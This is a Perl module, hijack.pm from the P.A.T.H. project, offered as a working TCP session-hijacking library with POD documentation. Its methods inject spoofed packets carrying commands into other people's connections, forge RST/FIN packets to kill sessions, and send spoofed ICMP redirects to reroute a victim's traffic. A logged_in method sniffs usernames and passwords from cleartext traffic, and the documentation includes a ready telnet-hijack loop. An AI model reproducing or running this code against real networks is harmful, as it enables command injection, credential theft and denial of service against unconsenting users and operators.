package path::hijack;

# Module to store all the hijacking stuff
# This modul can be run in stateful or stateless mode
# Currently it only supports TCP hijacking methods like:
# - injecting a packet
# - greet the victim client
# - resetting a connection
# - create and send a ICMP redirect message
#
# For more information please read the POD documentation
#
# Programmed by Bastian Ballmann and Stefan Krecher
#
# Last Update: 07.06.2004
# 
# This program is free software; you can redistribute 
# it and/or modify it under the terms of the 
# GNU General Public License version 2 as published 
# by the Free Software Foundation.
#
# This program is distributed in the hope that it will 
# be useful, but WITHOUT ANY WARRANTY; without even 
# the implied warranty of MERCHANTABILITY or FITNESS 
# FOR A PARTICULAR PURPOSE. 
# See the GNU General Public License for more details. 



###[ Loading modules ]###

use NetPacket::Ethernet qw(:strip); # Decoding ethernet packets
use NetPacket::IP qw(:strip);       # Decoding IP packets
use NetPacket::TCP;                 # Decoding TCP packets
use Net::RawIP;                     # Creating raw packets
use path::config;
use strict;
use Carp qw(croak);

###[ Constructor ]###

# Create a hijack object from a Net::Pcap packet reference
# Default mode is stateless
# Parameter: Pcap packet object
sub new
{
    my ($class, $packet) = @_;
    my $obj = {};

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    $obj->{src_ip} = $ip->{src_ip};         # Current source ip (stateless mode)
    $obj->{dest_ip} = $ip->{dest_ip};       # Current destination ip (stateless mode)
    $obj->{src_port} = $tcp->{src_port};    # Current source port (stateless mode)
    $obj->{dest_port} = $tcp->{dest_port};  # Current destination port (stateless mode)
    $obj->{seqnum} = $tcp->{seqnum};        # Current sequence number (stateless mode)
    $obj->{acknum} = $tcp->{acknum};        # Current acknowledgement number (stateless mode)
    $obj->{flags} = $tcp->{flags};          # Current TCP flags
    $obj->{hijacked} = [];                  # Array to store hijacked connections
    $obj->{login_flag} = 0;                 # Flag to remember if we have seen a correct login process
    $obj->{stateful} = 0;                   # Flag to remember if we run in stateless or stateful mode
    $obj->{server_ip} = "";                 # Server IP (stateful mode)
    $obj->{client_ip} = "";                 # Client IP (stateful mode)
    $obj->{server_port} = "";               # Server Port (stateful mode)
    $obj->{client_port} = "";               # Client Port (stateful mode)
    $obj->{server_seq} = "";                # Server Sequence Nummer (stateful mode)
    $obj->{server_ack} = "";                # Server Acknowledgement Nummer (stateful mode)
    $obj->{client_seq} = "";                # Client Sequence Nummer (stateful mode)
    $obj->{client_ack} = "";                # Client Acknowledgement Nummer (stateful mode)

    return bless($obj,$class);
}



###[ General methods ]###

# Method check() checks if a packets belongs to "our" connection
# Parameter: Pcap packet object
sub check
{
    my ($obj,$packet) = @_;
    my ($src_ip,$dest_ip,$src_port,$dest_port);

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    # Are we running in stateful mode?
    if($obj->{stateful})
    {
	# Server --> Client
	if( ($obj->{server_ip} eq $ip->{src_ip}) &&
	    ($obj->{client_ip} eq $ip->{dest_ip}) &&
	    ($obj->{server_port} eq $tcp->{src_port}) &&
	    ($obj->{client_port} eq $tcp->{dest_port}) &&
	    ($tcp->{winsize} ne "2323") )
	{
	    return 1;
	}

	# Client --> Server
	elsif( ($obj->{client_ip} eq $ip->{src_ip}) &&
	    ($obj->{server_ip} eq $ip->{dest_ip}) &&
	    ($obj->{client_port} eq $tcp->{src_port}) &&
	    ($obj->{server_port} eq $tcp->{dest_port}) &&
	    ($tcp->{winsize} ne "2323") )
	{
	    return 1;
	}
	else
	{
	    return 0;
	}
    }

    # We are running in stateless mode
    else
    {
	if( ($obj->{src_ip} eq $ip->{src_ip}) && 
	    ($obj->{dest_ip} eq $ip->{dest_ip}) && 
	    ($obj->{src_port} eq $tcp->{src_port}) && 
	    ($obj->{dest_port} eq $tcp->{dest_port}) &&
	    ($tcp->{winsize} ne "2323") )
	{
	    return 1;
	}
	elsif( ($obj->{src_ip} eq $ip->{dest_ip}) &&
	       ($obj->{dest_ip} eq $ip->{src_ip}) &&
	       ($obj->{src_port} eq $tcp->{dest_port}) &&
	       ($obj->{dest_port} eq $tcp->{src_port}) &&
	       ($tcp->{winsize} ne "2323") )
	{
	    return 1;
	}
	else
	{
	    return 0;
	}
    }
}


# Method check_port() checks if a packet comes and / or goes to a speficied port
# Parameter: packet object, src and dest port
sub check_port
{
    my ($obj,$packet,$src_port,$dst_port) = @_;

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    # We are not interessted in the source port
    if( ($src_port == 0) || ($src_port eq "NULL") )
    {
	($tcp->{dest_port} eq $dst_port) ?  return 1 : return 0;
    }
    
    # We are not interessted in the destination port
    elsif( ($dst_port == 0) || ($dst_port eq "NULL") )
    {
	($tcp->{src_port} eq $src_port) ? return 1 : return 0;
    }

    # Check if both ports match
    else
    {
	( ($tcp->{src_port} eq $src_port) && ($tcp->{dest_port} eq $dst_port) ) ? return 1 : return 0;
    }
}


# Method check_ip() checks if a packet comes and / or goes to a specified ip address
# Parameter: packet object, src and dest ip
sub check_ip
{
    my ($obj,$packet,$src_ip,$dst_ip) = @_;

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));

    # We are not interessted in the source IP 
    if( ($src_ip == 0) || ($src_ip == "NULL") )
    {
	($dst_ip eq $ip->{dest_ip}) ? return 1 : return 0;
    }

    # We are not interessted in the destination IP 
    elsif( ($dst_ip == 0) || ($dst_ip eq "NULL") )
    {
	($src_ip eq $ip->{src_ip}) ? return 1 : return 0;
    }

    # Check if both ips match
    elsif( ($ip->{src_ip} eq $src_ip) && ($ip->{dest_ip} eq $dst_ip) )
    {
	return 1;
    }
    else
    {
	return 0;
    }
}


# Method check_flag() checks if the packet has got the specified flag set
# Parameter: packet object, flag
sub check_flag
{
    my($obj,$packet,$flag) = @_;

    $flag = lc($flag);
    my %flags;

    # Decode the packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});
    
    $flags{urg} = 0x20;
    $flags{ack} = 0x10;
    $flags{psh} = 0x08;
    $flags{rst} = 0x04;
    $flags{syn} = 0x02;
    $flags{fin} = 0x01;

    ($tcp->{flags} & $flags{$flag}) ? return 1 : return 0;
}


# Method stateful() sets the client / server properties
# Now we now the direction of a packet
# Parameter: Net::Pcap packet object, Source (server|client)
sub stateful
{
    my($obj,$packet,$src) = @_;

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    # Connection should be observed in stateful mode
    $obj->{stateful} = 1;

    # This packets was send by the server
    if($src eq "server")
    {
	$obj->{server_ip} = $ip->{src_ip};
	$obj->{client_ip} = $ip->{dest_ip};
	$obj->{server_port} = $tcp->{src_port};
	$obj->{client_port} = $tcp->{dest_port};
	$obj->{server_seq} = $tcp->{seqnum};
	$obj->{server_ack} = $tcp->{acknum};
    }
    
    # This packet was send by the client
    elsif($src eq "client")
    {
	$obj->{server_ip} = $ip->{dest_ip};
	$obj->{client_ip} = $ip->{src_ip};
	$obj->{server_port} = $tcp->{dest_port};
	$obj->{client_port} = $tcp->{src_port};
	$obj->{client_seq} = $tcp->{seqnum};
	$obj->{client_ack} = $tcp->{acknum};
    }	
    else
    {
	print "Unkown option $src in method stateful()\n";
    }

    return $obj;
}


# Method stateless() sets the hijacking mode back to stateless
sub stateless { return $_[0]->{stateful} = 0; }


# Method set_server_seq() saves the server sequence- and acknowledgenumber.
# Parameter: Net::Pcap packet object
sub set_server_seq
{
    my($obj,$packet) = @_;

    # Are we running in stateful mode?
    unless($obj->{stateful}) 
    { 
	print "You are not running in stateful mode.\n";
	print "set_server_seq() aborts!\n"; 
	return 0; 
    }

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    $obj->{server_seq} = $tcp->{seqnum};
    $obj->{server_ack} = $tcp->{ackum};
    return $obj;
}



# Method set_client_seq() saves the client sequence- and acknowledgenumber.
# Parameter: Net::Pcap packet object
sub set_client_seq
{
    my($obj,$packet) = @_;

    # Are we running in stateful mode?
    unless($obj->{stateful}) 
    { 
	print "You are not running in stateful mode.\n";
	print "set_client_seq() aborts!\n"; 
	return 0; 
    }

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    $obj->{client_seq} = $tcp->{seqnum};
    $obj->{client_ack} = $tcp->{ackum};
    return $obj;
}


# Method server_seq() returns true if the server sequence- and acknowledgementnumber is known
sub server_seq
{
    (($_[0]->{server_seq}) && ($_[0]->{server_ack}) && ($_[0]->{server_seq} != 0) && ($_[0]->{server_ack} != 0)) ? return 1 : return 0;
}



# Method client_seq() returns true if the client sequence- and acknowledgementnumber is known
sub client_seq
{
    (($_[0]->{client_seq}) && ($_[0]->{client_ack}) && ($_[0]->{client_seq} != 0) && ($_[0]->{client_ack} != 0)) ? return 1 : return 0;
}


# Method is_established() checks if the packet has got the ACK and not the SYN flag set
sub is_established
{
    my ($obj,$packet) = @_;
    ($obj->check_flag($packet,"syn")) ? return 0 : return 1;
}


# Method logged_in() tries to sniff a login and tries to figure out
# if a user is already logged in.
# This method is too buggy to use it anyway...
sub logged_in
{
    my($obj,$packet) = @_;

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});
    my $payload = $tcp->{data};

    if( (($payload =~ /USER/i) || ($payload =~ /login/i)) && !($payload =~ /last\s*login/ig) )
    {
	print "Found login string\n";
	$obj->{loign_flag} = 1;
	return 0;
    }
    elsif(($payload =~ /password/i) || ($payload =~ /PASS/i))
    {
	print "Found password string\n";
	$obj->{login_flag} = 2;
	return 0;
    }
    elsif($payload =~ /last\s*login/ig)
    {
	print "Found last login message\n";
	$obj->{login_flag} = 3;
    }

    if($obj->{login_flag} == 1)
    {
	$obj->{login} = $payload;
	$obj->{login_flag} = 0;
	print "User $payload\n";
    }
    elsif($obj->{login_flag} == 2)
    {
	$obj->{password} = $payload;
	$obj->{login_flag} = 0;
	print "Password $payload\n";
    }

    if($obj->{login_flag} == 3)
    {
	print "User logged in\n";
	return 1;
    }
    else
    {
	return 0;
    }
    
}

# Method update() updates the object with a new Net::Pcap packet object
# This is only useful if you are runnning in stateless mode.
sub update
{
    my ($obj, $packet) = @_;

    # Are we running in stateful mode?
    if($obj->{stateful})
    {
	print "You are running in stateful mode.\n";
	print "update() aborted!\n";
	return 0;
    }

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    $obj->{src_ip} = $ip->{src_ip};
    $obj->{dest_ip} = $ip->{dest_ip};
    $obj->{src_port} = $tcp->{src_port};
    $obj->{dest_port} = $tcp->{dest_port};
    $obj->{seqnum} = $tcp->{seqnum};
    $obj->{acknum} = $tcp->{acknum};
    $obj->{flags} = $tcp->{flags};

    return $obj;
}



# Method update_seq() updates the sequence and acknowledgement numbers in stateless mode
sub update_seq
{
    my ($obj, $packet) = @_;

    # Are we running in stateful mode?
    if($obj->{stateful})
    {
	print "You are running in stateful mode.\n";
	print "update_seq() aborted!\n";
	return 0;
    }

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    $obj->{seqnum} = $tcp->{seqnum};
    $obj->{acknum} = $tcp->{acknum};

    return $obj;
}


# Method is_hijackable checks if we can hijack the connection (in other words if we
# can see the sequence- and acknowledgement numbers
sub is_hijackable
{
    my $obj = shift;

    # Are we running in stateful mode?
    if($obj->{stateful})
    {
	(($obj->{client_seq}) && ($obj->{client_ack}) && ($obj->{server_seq}) && ($obj->{server_ack})) ? return 1 : return 0;
    }
    # We are running in stateless mode
    else
    {
	( ($obj->{seqnum}) && ($obj->{acknum}) ) ? return 1 : return 0;
    }
}


# Method is_hijacked() remembers that this connection was already hijacked
# Parameter: Pcap packet object
sub is_hijacked
{
    my $obj = shift;
    my $packet = shift;

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});

    push @{$obj->{hijacked}},$ip->{src_ip} . " " . $ip->{dst_ip};
    return $obj;
}


# Method unset_hijacked() can be used to forget a hijacked connection.
sub unset_hijacked
{
    my $obj = shift;
    my $src = shift;
    my $dst = shift;

    # Delete an entry by it's source and destination IP
    if(($src ne "") && ($dst ne ""))
    {
	# Durchwuehle das Hijacked Array nach der Source und Destination IP
	# Wenn sie gefunden wurde, loesche sie...
	for(my $i=0; $i < scalar(@{$obj->{hijacked}}); $i++)
	{
	    if( ($obj->{hijacked}->[$i] eq "$src $dst") || ($obj->{hijacked}->[$i] eq "$dst $src") )
	    {
		splice(@{$obj->{hijacked}},$i,$i+1);
		last;
	    }
	}
    }

    # Delete all entries
    else
    {
	@{$obj->{hijacked}} = ();
    }

    return $obj;
}


# Method hijacked() checks if the connection the packet belongs to was hijacked before
# Parameter: Pcap packet object
sub hijacked
{
    my $obj = shift;
    my $packet = shift;

    # Decode packet
    my $ip = NetPacket::IP->decode(eth_strip($packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});


    for(@{$obj->{hijacked}})
    {
	return 1 if( ($ip->{src_ip} . " " . $ip->{dst_ip} eq $_) ||  ($ip->{dst_ip} . " " . $ip->{src_ip} eq $_) );
    }

    return 0;
}




###[ HIJACKING METHODS ]###


# Method infiltrate() infiltrates a command on server side
# Parameter: Command to infiltrate
sub infiltrate
{
    my($obj,$command) = @_;
    my $packet = new Net::RawIP;

    # Are we running in stateful mode?
    # Then inject the packet spoofed from the client to the server
    if($obj->{stateful})
    {
	$packet->set({
	    ip => {
		saddr => $obj->{client_ip},
		daddr => $obj->{server_ip}
	    },
	    tcp => {
		source => $obj->{client_port},
		dest => $obj->{server_port},
		psh => 1,
		ack => 1,
		seq => $obj->{server_ack},
		ack_seq => $obj->{client_ack},
		window => "2323",
		data => "$command\n"
		}
	});
	
    }

    # We are running in stateless mode
    else
    {
	$packet->set({
	    ip => {
		saddr => $obj->{src_ip},
		daddr => $obj->{dest_ip}
	    },
	    tcp => {
		source => $obj->{src_port},
		dest => $obj->{dest_port},
		psh => 1,
		ack => 1,
		seq => $obj->{seqnum},
		ack_seq => $obj->{acknum},
		window => "2323",
		data => "$command\n"
		}
	});

    }

    $packet->send(0,1);
}



# Method greet_client() sends a message to the client and resets his connection
# This method can only be used in stateful mode.
# Parameter: Message-String
sub greet_client
{
    my($obj,$command) = @_;
    my $packet = new Net::RawIP;

    # Are we running in stateful mode?
    unless($obj->{stateful}) { print "You are not running in stateful mode!\n"; return; }

    # Create the packet...
    $packet->set({
	ip => {
	    saddr => $obj->{server_ip},
	    daddr => $obj->{client_ip}
	},
	tcp => {
	    source => $obj->{server_port},
	    dest => $obj->{client_port},
	    rst => 1,
	    seq => $obj->{client_ack},
	    ack_seq => $obj->{server_ack},
	    window => "2323",
	    data => $command
	    }
    });

    # ...and send it over the wire
    $packet->send(0,1);
}



# Create and send a Reset packet
# The first parameter to pass is a reset flag (RST|FIN)
# the second one is only necessary in stateful mode and
# tells the target direction (client|server)
sub reset
{
    my $obj = shift;
    my $flag = shift;
    my $target = shift;
    my $packet = new Net::RawIP;
    my($src_ip,$dest_ip,$src_port,$dest_port,$seqnum,$acknum);

    $flag = lc($flag);

# Are we running in stateful mode?
    if($obj->{stateful})
    {
	# Which direction should be resettet?
	if($target eq "server")
	{
	    $src_ip = $obj->{client_ip};
	    $dest_ip = $obj->{server_ip};
	    $src_port = $obj->{client_port};
	    $dest_port = $obj->{server_port};
	    $seqnum = $obj->{server_ack};
	    $acknum = $obj->{client_ack};
	}
	else
	{
	    $src_ip = $obj->{server_ip};
	    $dest_ip = $obj->{client_ip};
	    $src_port = $obj->{server_port};
	    $dest_port = $obj->{client_port};
	    $seqnum = $obj->{client_ack};
	    $acknum = $obj->{server_ack};
	}
    }
    
    # We are running in stateless mode
    else
    {
	$src_ip = $obj->{dest_ip};
	$dest_ip = $obj->{src_ip};
	$src_port = $obj->{dest_port};
	$dest_port = $obj->{src_port};
	$seqnum = $obj->{acknum};
	$acknum = $obj->{acknum};
    }


# Reset via FIN packet
    if($flag eq "fin")
    {
# Create the packet
	$packet->set({
	    ip => {
		saddr => $src_ip,
		daddr => $dest_ip
		},
		    tcp => {
			source => $src_port,
			dest => $dest_port,
			fin => 1,
			seq => $seqnum,
			ack_seq => $acknum
		    }
	});

    }
    
# Reset via RST packet
    else
    {
# Create the packet
	$packet->set({
	    ip => {
		saddr => $src_ip,
		daddr => $dest_ip
	    },
	    tcp => {
		source => $src_port,
		dest => $dest_port,
		rst => 1,
		seq => $seqnum,
		ack_seq => $acknum
	    }
	});
}

# ...and throw it on the wire!
  $packet->send(0,1);
}


###[ Special functions ]###


# Bruteforce packet header
# This method is used to bruteforce source and destination ports and
# icmp code and type combinations.
# Parameter: config hash, flag
# Flag can be srcport or dstport
sub bruteforce
{
    my $cfg = shift;
    my $flag = shift;
    my ($packet,@packets, %icmp_code,@srcports,@dstports);

    # Bruteforce ICMP code and type
    if(lc($cfg->{'parameter'}->{'protocol'}) eq "icmp")
    {
	# Valid ICMP type and code combinations
	$icmp_code{0} = ['0'];
	$icmp_code{3} = ['0','1','2','3','4','5','6','7','8','9','10','11','12','13','14','15'];
	$icmp_code{4} = ['0'];
	$icmp_code{5} = ['0','1','3'];
	$icmp_code{6} = ['0'];
	$icmp_code{8} = ['0'];
	$icmp_code{9} = ['0'];
	$icmp_code{10} = ['0'];
	$icmp_code{11} = ['0','1'];
	$icmp_code{12} = ['0','1','2'];
	$icmp_code{13} = ['0'];	
	$icmp_code{14} = ['0'];	
	$icmp_code{15} = ['0'];	
	$icmp_code{16} = ['0'];	
	$icmp_code{17} = ['0'];	
	$icmp_code{18} = ['0'];	
	$icmp_code{30} = ['0','1'];
	$icmp_code{31} = ['0'];
	$icmp_code{32} = ['0'];
	$icmp_code{33} = ['0'];
	$icmp_code{34} = ['0'];
	$icmp_code{35} = ['0'];
	$icmp_code{36} = ['0'];
	$icmp_code{37} = ['0'];
	$icmp_code{38} = ['0'];
	$icmp_code{40} = ['0','1','2','3','4','5'];

	while(my ($code,$types) = each %icmp_code)
	{
	    for(@{$types})
	    {
		$cfg->{'packet'}->{'icmp'}->{'type'} = $_;
		$cfg->{'packet'}->{'icmp'}->{'code'} = $code;
		$cfg->{'parameter'}->{'protocol'} = "icmp";
		$packet = create_packet($cfg);
		push @packets, $packet;
	    }
	}
    }

    # Bruteforce TCP / UDP Ports 
    elsif((lc($cfg->{'parameter'}->{'protocol'}) eq "udp") || 
	  (lc($cfg->{'parameter'}->{'protocol'}) eq "tcp"))
    {
	# Bruteforce the source port
	if($flag eq "srcport")
	{
	    for(my $i = 1; $i <= 1024; $i++)
	    {		
		$cfg->{'packet'}->{$cfg->{'parameter'}->{'protocol'}}->{'srcport'} = $i;
		$packet = create_packet($cfg);
		push @packets, $packet;
	    }
	}

	# Bruteforce the destination Port
	elsif($flag eq "dstport")
	{
	    for(my $i = 1; $i <= 1024; $i++)
	    {
		$cfg->{'packet'}->{$cfg->{'parameter'}->{'protocol'}}->{'dstport'} = $i;
		$packet = create_packet($cfg);
		push @packets, $packet;
	    }
	}

	# Bruteforce source and destination port
	elsif($flag eq "ports")
	{
	    for(my $i = 1; $i <= 1024; $i++)
	    {
		for(my $x = 1; $x <= 1024; $x++)
		{
		    $cfg->{'packet'}->{$cfg->{'parameter'}->{'protocol'}}->{'srcport'} = $i;
		    $cfg->{'packet'}->{$cfg->{'parameter'}->{'protocol'}}->{'dstport'} = $x;		    
		    $packet = create_packet($cfg);
		    push @packets, $packet;

		    $cfg->{'packet'}->{$cfg->{'parameter'}->{'protocol'}}->{'srcport'} = $x;
		    $cfg->{'packet'}->{$cfg->{'parameter'}->{'protocol'}}->{'dstport'} = $i;		    
		    $packet = create_packet($cfg);
		    push @packets, $packet;
		}
	    }
	}
    }

    return \@packets;
}


# Create a packet (Net::RawIP object) 
# from a config hash
sub create_packet
{
    my $config = shift;
    my $packet;

    # Create a TCP / IP packet
    if($config->{'parameter'}->{'protocol'} eq "tcp")
    {
	$packet = new Net::RawIP;
	$packet->set({
	    ip => {
		saddr => $config->{'packet'}->{'ip'}->{'srcip'},
		daddr => $config->{'packet'}->{'ip'}->{'dstip'},
		frag_off => $config->{'packet'}->{'ip'}->{'frag'},
		ttl => $config->{'packet'}->{'ip'}->{'ttl'}
	    } ,
	    
	    tcp => {
		source => $config->{'packet'}->{'tcp'}->{'srcport'}, 
		dest => $config->{'packet'}->{'tcp'}->{'dstport'},
		syn => $config->{'packet'}->{'tcp'}->{'flags'}->{'syn'}, 
		ack => $config->{'packet'}->{'tcp'}->{'flags'}->{'ack'}, 
		fin => $config->{'packet'}->{'tcp'}->{'flags'}->{'fin'}, 
		rst => $config->{'packet'}->{'tcp'}->{'flags'}->{'rst'}, 
		psh => $config->{'packet'}->{'tcp'}->{'flags'}->{'psh'}, 
		urg => $config->{'packet'}->{'tcp'}->{'flags'}->{'urg'},
		seq => $config->{'packet'}->{'tcp'}->{'seq'},
		ack_seq => $config->{'packet'}->{'tcp'}->{'ack'},
		window => $config->{'packet'}->{'tcp'}->{'win'},
		data => $config->{'packet'}->{'data'}
	    }
	});
    }

    # Create a UDP / IP packet
    elsif($config->{'parameter'}->{'protocol'} eq "udp")
    {
	$packet = new Net::RawIP({udp =>{}});
	$packet->set({
	    ip => {
		saddr => $config->{'packet'}->{'ip'}->{'srcip'},
		daddr => $config->{'packet'}->{'ip'}->{'dstip'}
	    } ,
	    udp => {
		source => $config->{'packet'}->{'tcp'}->{'srcport'}, 
		dest => $config->{'packet'}->{'tcp'}->{'dstport'},
		data => $config->{'packet'}->{'data'}
		}
	});
    }

    # Create a ICMP / IP packet
    elsif($config->{'parameter'}->{'protocol'} eq "icmp")
    {
	$packet = new Net::RawIP({icmp => {}});
	$packet->set({ 
	    ip  => { ttl      => $config->{'packet'}->{'ip'}->{'ttl'},
		     protocol => 1,
		     tos      => 0,
		     saddr    => $config->{'packet'}->{'ip'}->{'srcip'},
		     daddr    => $config->{'packet'}->{'ip'}->{'dstip'},
		 },
	    icmp=> { type    => $config->{'packet'}->{'icmp'}->{'type'},
		     code    => $config->{'packet'}->{'icmp'}->{'code'},
		     data    => $config->{'packet'}->{'data'},
		     gateway => $config->{'packet'}->{'icmp'}->{'gateway'},
		     mtu => $config->{'packet'}->{'icmp'}->{'mtu'}
		 }
	});
    }

    # Create IP only packet
    else
    {
	$packet = new Net::RawIP;
	$packet->set({
	    ip => {
		saddr => $config->{'packet'}->{'ip'}->{'srcip'},
		daddr => $config->{'packet'}->{'ip'}->{'dstip'},
		frag_off => $config->{'packet'}->{'ip'}->{'frag'},
		ttl => $config->{'packet'}->{'ip'}->{'ttl'}
	    } 
	});
    }

    return $packet;
}


# Method icmp_redirect() send an ICMP recirect message
# Parameter: victim-ip, old-gateway, new-gateway, destination-of-the-new-route
sub icmp_redirect 
{
    my ($victim, $old_gw, $new_gw, $route_destination) = @_;

    check_ip($victim) or die "Bad victim ip $victim\n";
    check_ip($old_gw) or die "Bad old gw ip $old_gw\n";
    check_ip($new_gw) or die "Bad new gw ip $new_gw\n";
    check_ip($route_destination) or die "Bad route ip $route_destination\n";

    # new gateway
    my @quad = split(/\./, $new_gw);
    my $ip_gw_int = (($quad[3]*16777216)+($quad[2]*65536)+($quad[1]*256)+$quad[0]);

    # Here the "original" ip packet is constructed.
    # The 64 bit payload can be left out
    my $ip = NetPacket::IP->decode('');
    $ip->{ver}      = 4;
    $ip->{src_ip}   = $victim;
    $ip->{dest_ip}  = $route_destination;

    # now construct the ICMP redirect packet
    my $packet = new Net::RawIP({icmp => {}});
    $packet->set({
		      ip => {
			  protocol => 1,
			  tos => 0,
			  saddr   => $old_gw,
			  daddr   => $victim,
		      },
		      icmp => {
			  type    => 5,
			  code    => 1,
			  # encode() shall calculize the new IP header checksum
			  data    => $ip->encode(),
			  gateway => $ip_gw_int 
			  }
		  });

    # throw it on the wire
    $packet->send(0,1);    
}

###[ Thats the end folks =) ]###

1;


__END__

###[ POD documentation ]###

=pod
=head2 NAME

   hijack.pm  --  P.A.T.H hijacking stuff

=head2 SYNOPSIS

   use path::hijack;
   use Net::PcapUtils;

   Net::PcapUtils::loop(\&sniffit,
                        PROMISC => 1,
		        FILTER => 'tcp and port 23',
		        DEV => 'eth0');

   sub sniffit
   {
       unless(defined $connection)
       {
	   $connection = path::hijack->new($packet);
       }  

      if($connection->is_established)
      {
         if( ($connection->check($packet)) && ($connection->check_port($packet,23,0)) )
         {
	    $connection->update($packet);
	    $connection->reset('rst');
         }
      }
   }


=head2 DESCRIPTION

   This module contains all the hijacking stuff of the P.A.T.H project.
   It supports stateful and stateless hijacking, connection resetting, 
   packet infiltration and more.
   Per default the module runs in stateless mode.
   If you want to run it in stateful mode use the stateful() method first.
   Please note that this module can only handle *one* connection in *one*
   object so if you want to handle more than one connection you have to
   store one hijack object per connection in an array or something like
   that. Maybe this will change in the future... Who knows? ;)


=head2 METHODS

   new
   check
   check_port
   check_ip
   check_flag
   stateful
   stateless
   set_server_seq
   server_seq
   set_client_seq
   client_seq
   is_established
   update
   update_seq   
   is_hijackable
   is_hijacked
   hijacked
   unset_hijacked
   infiltrate
   greet_client
   reset
   create_packet
   bruteforce


=head2 DESCRIPTION OF METHODS

=item B<new()>

   $connection = hijack->new($packet);

   This method creates a new stateless path::hijack object.
   It takes a Net::PcapUtils packet object as parameter.


=item B<check()>

   $connection->check($packet);

   This method simply checks if the packet has got the same
   source or destination port / ip as the last saved one.
   If you are running in stateful method it will check if
   the specified packet was send by the client or by the
   the server.
   The method returns true if the packet belongs to "our"
   connection otherwise it will return false.


=item B<check_port>

   $connection->check_port($packet,src,dest);

   Check_port() checks if the packet has got the specified src
   and destination port.
   You can choose a 0 or NULL if the number of one port is of 
   no interest for you.
   The method returns true if the specified ports are found in
   the packet otherwise it returns false.


=item B<check_ip>

   $connection->check_ip($packet,src,dest);

   The same as check_port(), but checks the ips...


=item B<check_flag>

    $connection->check_flag($packet,$flag);

    Check if the given flag is set in the TCP header of 
    the passed packet. If the flag is set this method
    returns true otherwise it returns false.


=item B<stateful>

   $connection->stateful($packet,[server|client]);

    This method takes two options:
    A Net::PcapUtils packet object
    A direction: server or client
    Now the module can distinguish between a client
    and a server module. You can check the dicrection
    of the captured packet with the check_port() method.

=item B<stateless>

    $connection->stateless();

    This method tells the module that we dont want to run
    in stateful mode any more.

=item B<set_server_seq()>

   $connection->set_server_seq($packet);

    Save the sequence and acknowledgement number in the packet
    as server seq and ack.
    There is also a set_client_seq method.

=item B<server_seq()>

   $connection->server_seq()

    Returns true if the server sequence and acknowledgment number
    is known.
    There is also a client_seq method.
    This method does only make sense if you are running in stateful
    mode!


=item B<update()>

    $connection->update($packet);

    This method updates connection information in stateless 
    connection hijacking.
    Use update_seq if you only want to update the sequence and
    acknowledgement numbers.

=item B<is_hijackable()>

    $connection->is_hijackable();

    Returns true if you can sniff the sequence and acknowledgement numbers.


=item B<is_hijacked>

    $connection->is_hijacked();

    Remember that you have already hijacked the connection.
    Use the hijacked() method to check if a connection was marked
    as hijacked before.

=item B<unset_hijacked>

    $connection->unset_hijacked($src_ip,$dst_ip);

    Remove the specified source and destination ip from the
    hijacked array so we can hijack the connection again.
    If no parameter is specified all hijacked connection are
    deleted!


=item B<infiltrate()>

    $connection->infiltrate($command);

    This method will send a spoofed packet from the client to the
    server with the specified payload.
    In stateful mode this method injects the command to the server
    otherwise to the last specified destination ip and port.

=item B<greet_client()>

    $connection->greet_client("Hello lamer! Nice weather outside! =)");

    Use this method if you want to send a message to the client.
    This method can only be used in the stateful method.

=item B<reset()>

   $connection->reset($flag,$direction);

   The first parameter to pass is a reset flag (RST|FIN)
   the second one is only necessary in stateful mode and
   tells the target direction (client|server)

=item B<create_packet()>

    $packet = $connection->create_packet($cfg);

    This method takes a config hash to create and return a
    Net::RawIP packet object.
    See config module documentation for more information.

=item B<bruteforce()>

    $connection->bruteforce($cfg,$flag);

    This method takes a config hash and a flag to let you
    bruteforce some header options. Currently flag can be
    either srcport or dstport to bruteforce tcp or udp source
    or destination ports (from 1 - 1024). If this method is
    called with a config hash, which protocol is set to icmp
    the valid icmp type and code combinations will be 
    bruteforced.

=head2 BUGS

    Method logged_in is to buggy to use it anyway.
    Please send bug reports to Crazydj@chaostal.de

=head2 AUTHOR

    Bastian Ballmann [ Crazydj@chaostal.de ]
    http://p-a-t-h.sourceforge.net


=head2 COPYRIGHT

    This module is free software.
    Its licensed under the GPL.

